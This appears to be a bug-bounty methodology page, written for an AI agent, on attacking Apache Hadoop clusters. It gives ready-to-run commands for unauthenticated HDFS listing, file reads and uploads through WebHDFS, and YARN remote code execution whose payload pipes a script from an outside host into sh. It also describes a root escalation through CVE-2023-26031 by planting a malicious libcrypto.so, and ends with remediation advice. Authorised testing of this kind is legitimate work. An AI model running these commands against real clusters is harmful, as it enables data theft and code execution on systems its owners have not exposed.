---
technology: "Apache Hadoop (HDFS & YARN)"
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: big-data
version: "1.0"
provenance: "upstream-only; zero corpus evidence by design (owner-approved bucket-2 new-unit wave 2026-11-13) — WebHDFS/ResourceManager REST syntax per hadoop.apache.org docs, CVE-2023-26031 per hadoop.apache.org/cve_list.html, NSE script names verified against nmap.org/nsedoc + rewritten from HackTricks (src/network-services-pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# Hadoop bug-bounty methodology

Companion overview: [[hadoop]].

Scope: web-UI/NSE enumeration across the Hadoop port family, unauthenticated HDFS browsing and upload through WebHDFS, YARN application-submission code execution on the ResourceManager REST API (8088) and the RPC ports (8031/8032), and the container-executor local privilege escalation. Related: [[kafka]], [[elasticsearch]], [[kerberos]].

## Phase 0 — Tooling

`nmap` with the Hadoop NSE scripts (they ship in the default script set), `curl` for WebHDFS and the YARN REST API, and `readelf` for the container-executor check. Everything below is plain HTTP against JSON — no bespoke client needed unless you target the protobuf RPC ports.

## Phase 1 — Enumeration

The port panel (verify per target version — 3.x moved several web UIs):

```bash
nmap -sV -p 50030,50060,50070,50075,50090,8088,8042,8031,8032,9870,9864,14000 198.51.100.50
nmap --script hadoop-namenode-info,hadoop-datanode-info,hadoop-jobtracker-info,\
hadoop-tasktracker-info,hadoop-secondary-namenode-info -p 50030,50060,50070,50075,50090 198.51.100.50
```

The five NSE scripts are one-per-legacy-port: `hadoop-jobtracker-info` (50030), `hadoop-tasktracker-info` (50060), `hadoop-namenode-info` (50070 — version, compile date, upgrade status, filesystem stats), `hadoop-datanode-info` (50075), `hadoop-secondary-namenode-info` (50090). On 8088 the ResourceManager UI (`/cluster/cluster`) shows cluster metrics, queue ACLs, and live applications — the honest inventory of what runs there already. HttpFS, if enabled, repeats WebHDFS on **14000**.

Security-mode triage before anything else: does `?user.name=hdfs` work (simple mode) or do requests demand Negotiate (secure mode)? In secure mode, with a valid ticket, the same REST surfaces answer `curl --negotiate -u :` — assess what identity your ticket maps to rather than stopping at "Kerberos on".

## Phase 2 — HDFS browsing and exfil (WebHDFS, 50070/9870 or HttpFS 14000)

In `simple` mode the `user.name` parameter is the identity, bounded by HDFS permissions and proxy-user config. The three primitives:

```bash
# inventory the lake
curl "http://198.51.100.50:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"

# read any file the asserted user can read (note -L: OPEN redirects to a DataNode)
curl -L "http://198.51.100.50:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"

# write into the cluster
curl -X PUT -T ./payload \
  "http://198.51.100.50:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs" \
  -H 'Content-Type: application/octet-stream'
```

High-yield reads: `/etc/hadoop/*-site.xml` (nameservices, NN RPC addresses, Kerberos settings, credentials that made it into config), ingested export directories, anything named like `users`, `pii`, `exports`, `warehouse`.

## Phase 3 — YARN code execution (8088 REST)

The two-POST submission contract — first buy an application ID, then submit the application whose ApplicationMaster command is your shell:

```bash
curl -s -X POST http://198.51.100.50:8088/ws/v1/cluster/apps/new-application
# -> {"application-id":"application_1234567890000_0001", ...}

curl -s -X POST http://198.51.100.50:8088/ws/v1/cluster/apps \
  -H 'Content-Type: application/json' \
  -d '{
    "application-id": "application_1234567890000_0001",
    "application-name": "job",
    "am-container-spec": {
      "commands": { "command": "/bin/sh -c 'curl http://198.51.100.10/p.sh | sh'" }
    },
    "application-type": "YARN"
  }'
```

Honest gate-keeping for the report: the command runs in a container on some NodeManager as the submitting (pseudo) user — historically `dr.who` on insecure clusters — and only if queue ACLs and the cluster's submission policy admit you. When they do, this is remote code execution as first-party functionality; when they do not, the 8088 UI still enumerates the estate. Confirm execution through the application's logs in the UI (`/cluster/app/...`) or your callback.

If **8031/8032** (scheduler / application-client RPC) are exposed, older clusters accept the same job submission over protobuf with no authentication — the vector of several cryptominer campaigns. Treat those ports as the RCE surface whenever 8088 is filtered but they are not.

## Phase 4 — Local root from YARN (CVE-2023-26031)

Once you can submit containers (Phase 3), Hadoop 3.3.1–3.3.4 on Linux adds a node-level escalation: the SUID `container-executor` resolves its libraries through a **relative RUNPATH**, so a library planted in a writable path is loaded as root.

```bash
readelf -d /opt/hadoop/bin/container-executor | grep -E 'RUNPATH|RPATH'
# vulnerable when it shows $ORIGIN/:../lib/native/ (relative, not absolute)
ls -l /opt/hadoop/bin/container-executor   # root-owned + SUID makes it exploitable
```

The attack: drop a malicious `libcrypto.so` into the resolved path from inside a container, let a subsequent container launch load it. Fixed in **3.3.5** (the fix reverted the relative-path change); where secure containers are not required, ensure the binary is not SUID. Apache's own wording for the remote case: a cluster accepting work from remote users *may* permit them to gain root — gate the claim on actual submission rights.

## Phase 5 — Reporting

Default posture findings to write up: `simple` mode on an enterprise-reachable cluster; ResourceManager/NameNode web UIs reachable outside the cluster's subnet; 8031/8032 exposed alongside; no queue ACLs (submission open to the unauth pseudo-user); CVE-2023-26031 SUID binary on 3.3.1–3.3.4 NodeManagers. The remediation path is one sentence each: Kerberos secure mode, service-level ACLs, network segmentation of the management ports, upgrade past 3.3.5.
